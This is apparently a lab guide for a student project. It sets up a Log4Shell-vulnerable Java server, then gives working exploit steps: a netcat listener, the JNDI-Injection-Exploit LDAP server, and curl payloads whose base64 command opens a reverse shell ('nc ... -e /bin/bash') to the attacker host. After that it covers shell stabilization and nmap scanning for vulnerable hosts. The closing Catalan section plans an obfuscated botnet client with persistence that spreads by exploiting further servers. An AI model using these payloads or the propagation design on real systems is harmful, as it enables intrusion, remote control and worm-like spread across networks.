# Simulate the vulnerable server.
1. Install Java JDK 1.8.0_20. Download from: https://www.oracle.com/es/java/technologies/javase/javase8-archive-downloads.html
	1. For linux 64 bits download: "jdk-8u20-linux-x64.tar.gz"
	2. Extract the content to the Desktop
	3. Add Java JDK to the PATH: export PATH=/home/kali/Desktop/jdk1.8.0_20/bin:$PATH
	4. Check java version: "1.8.0_20" with following command: java -version
2. Execute following command: ```java -jar <.jar file located in the app folder>```

## Optional (build the server)
If you want to customize and build the server, you could follow next steps:

1. Install gradle 7.3.1. 
	1. https://services.gradle.org/distributions/
	2. https://linuxize.com/post/how-to-install-gradle-on-debian-10/ #Change 6.3 for 7.3.1.
2. Create a dir in "/home/gradle/src".
3. Put all the files from the repo: https://github.com/christophetd/log4shell-vulnerable-app

4. Install Java JDK 1.8.0_20. Download from: https://www.oracle.com/es/java/technologies/javase/javase8-archive-downloads.html
	1. For linux 64 bits download: "jdk-8u20-linux-x64.tar.gz"
	2. Extract the content to the Desktop
	3. Add Java JDK to the PATH: export PATH=/home/kali/Desktop/jdk1.8.0_20/bin:$PATH
	4. Check java version: "1.8.0_20" with following command: java -version

6. Go to "/home/gradle/src"
5. Execute gradle bootJar --no-daemon
6. Execute the vulnerable webserver: java -jar .jar

# Simulate the attack

Setup:
- Attacker: 10.0.2.9
- Victim (running vulnerable webserver): 10.0.2.10

1. Listen with nc in the attacker machine: nc -lvp 4444 -n
2. In the attacker machine download the exploit: https://github.com/welk1n/JNDI-Injection-Exploit
3. Execute the LDAP server: java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.2.9 -p 8888
4. Send the following payload to the vulnerable machine:
```curl 10.0.2.10:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.2.9:1389/Basic/Command/Base64/bmMgMTAuMC4yLjkgNDQ0NCAtZSAvYmluL2Jhc2g=}'```
5. Previous payload executes the following command in the victim: "nc 10.0.2.9 4444 -e /bin/bash". If you want to change the command, encode it in base64 and send the following payload:
```curl 10.0.2.10:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.2.9:1389/Basic/Command/Base64/<base64-encoded-command>}' ```

## How to get a full interactive shell
python3 -c "import pty; pty.spawn('/bin/bash')"
CTRL+Z
stty raw -echo;fg
id

source: https://ice-wzl.medium.com/netcat-shell-stabilization-248b83bcc06c

# How to scan local network to find log4shell vulnerable servers
1. Get network interfaces: ifconfig.
2. Scan all the subnets: nmap -sn 192.168.1.0/24
3. Port scan to detect if it can be a vulnerable app: "nmap -v 192.168.1.10" or "nmap -v -p- 192.168.1.10" (all ports)

# Discovery useful tools.
https://github.com/giterlizzi/nmap-log4shell
https://github.com/adilsoybali/Log4j-RCE-Scanner

# Proposta general del projecte
Setup: 2 maquines que estaran corrent a la mateixa xarxa amb un servidor vulnerable a log4shell.

Obtenir una reverse shell a una de les maquines
------------------------------------------------
fem un nmap, descobrim que hi ha un servidor que pot ser vulnerable
executem l'exploit i obtenim la reverse shell
descarreguem el client de la botnet (que estara ofuscat)
canviem la configuracio per si executar el client automaticamente si es reinicia el server (persistencia).
executem el client (segundo plano)

Propagacio
-----------
descarreguem un script (bash, python).
1. nmap per identificar mes servidors vulnerables a la xarxa local.
2. si troba un vulnerable executa l'exploit i obte una reverse shell
3. descarreguem botnet
4. canviem configuracio executar a l'inici (persistencia).
5. executem client
6. --- propagacio again...
